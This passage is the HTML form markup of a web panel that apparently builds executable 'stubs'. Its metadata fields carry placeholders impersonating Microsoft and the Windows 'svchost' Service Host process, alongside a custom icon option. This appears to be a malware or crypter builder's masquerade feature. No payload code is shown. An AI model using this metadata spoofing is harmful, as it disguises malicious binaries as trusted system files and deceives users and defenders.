                                  <div class='tab-pane fade show' id='assembly' role='tabpanel'>
                                    <!-- Material input -->
                                    <div class='md-form mt-3'>
                                      <p class='text-darkwhite'>Assembly Title</p>
                                      <input type='text' id='asmTitle' placeholder='pornhub.com;xnxx.com;google.com' name='svchost' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-3'>
                                      <p class='text-darkwhite'>Assembly Description</p>
                                      <input type='text' id='asmDescription' placeholder='Service Host' name='asmDescription' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-3'>
                                      <p class='text-darkwhite'>Assembly FileVersion</p>
                                      <input type='text' id='asmFileVersion' placeholder='1.0.0' name='asmFileVersion' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-3'>
                                      <p class='text-darkwhite'>Assembly Company</p>
                                      <input type='text' id='asmCompany' placeholder='Microsoft' name='asmCompany' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-3'>
                                      <p class='text-darkwhite'>Assembly Product</p>
                                      <input type='text' id='asmProduct' placeholder='Microsoft® Windows® Operating System' name='asmProduct' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-3'>
                                      <p class='text-darkwhite'>Assembly Copyright</p>
                                      <input type='text' id='asmCopyright' placeholder='© Microsoft Corporation. All rights reserved.' name='asmCopyright' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                    <!-- Material input -->
                                    <div class='md-form mt-3'>
                                      <p class='text-darkwhite'>Assembly Trademark</p>
                                      <input type='text' id='asmTrademark' placeholder='Microsoft™' name='asmTrademark' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                  </div>
                                  <div class='tab-pane fade show' id='builder' role='tabpanel'>
                                  <p class='font-weight-bold text-muted text-left text-lightred text-middle mb-3'>Stubs were only tested on Windows 10/2004 Build, if you experience issues then let us know.</p>
                                    <!-- Material input -->
                                    <div class='md-form'>
                                      <p class='text-darkwhite'>File Name</p>
                                      <input type='text' id='fileName' placeholder='File Name (without.exe)' name='fileName' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2 mt-3'>
                                        <input class='form-check-input mt-2' type='checkbox' value='useIcon' id='useIcon' name='useIcon' />
                                        <label class='form-check-label mt-2' for='useIcon'>Use Icon</label>
                                    </div>
                                    <div class='form-file mt-2'>
                                        <input type='file' class='form-file-input' id='customFile' accept='.ico' name='icon' />
                                        <label class='form-file-label' for='customFile'>
                                            <span class='form-file-text'>Choose file...</span>
                                            <span class='form-file-button'>Browse</span>
                                        </label>
                                    </div>
                                    <!-- Default checkbox -->
                                    <div class='form-check ml-2 mt-5 mb-2'>
                                        <input class='form-check-input mt-2' type='checkbox' value='tos' id='ToSCheck' name='ToSCheck' />
                                        <label class='form-check-label mt-2' for='ToSCheck'>I have read and I agree to the <a href='terms-of-service' target='_blank' class='text-primary'><b> Terms of Service</b></a></label>
                                    </div>
                                    <button id='load-button' type='submit' name='build' value='buildStub' class='btn btn-outline-primary waves-effect mt-auto' style='width:100%;'>Build</button>
                                    <input type='hidden' name='" . \Volnix\CSRF\CSRF::TOKEN_NAME . "' value='" . \Volnix\CSRF\CSRF::getToken() . "'/>
                                  </div>
                                </div>
                            </form>";
                            }
                        ?>
                  </div>
                </div>
            </div>
        </div>
    </div>
  </main>
  <!--Main layout-->


  <?php require_once 'includes/layout/footer.php'; require_once 'includes/realtime.php';?>